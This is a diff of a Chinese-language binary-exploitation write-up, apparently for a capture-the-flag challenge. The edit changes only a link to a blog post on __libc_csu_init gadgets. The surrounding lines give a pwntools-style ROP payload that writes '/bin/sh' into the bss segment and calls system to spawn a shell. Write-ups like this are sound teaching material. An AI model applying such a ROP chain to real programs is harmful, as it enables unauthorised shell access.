@@ -92,7 +92,7 @@ int main(int argc, const char **argv, const char **envp)
 
 ![pic3]
 
-5，然后接下来就是用64位通用gadget，调用read往bss段写“/bin/sh”，调用system函数，我构造的payload如下(其中gad1与gad2是[\_ libc \_csu \_init函数的通用gadget](https://sirhc.xyz/2018/06/03/__libc_csu_init%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%9A%E7%94%A8gadget/))：
+5，然后接下来就是用64位通用gadget，调用read往bss段写“/bin/sh”，调用system函数，我构造的payload如下(其中gad1与gad2是[\_ libc \_csu \_init函数的通用gadget](https://b0ldfrev.top/2018/06/03/__libc_csu_init%E5%87%BD%E6%95%B0%E7%9A%84%E9%80%9A%E7%94%A8gadget/))：
 
 	rop1='A'*24 + p64(ppppr)
 	rop1+= p64(gad1) + p64(0)+p64(1)+p64(read_got)+p64(9)+p64(bss_start)+p64(0)+p64(gad2)+"A"*56+ p64(poprdi) + p64(bss_start) + p64(system)
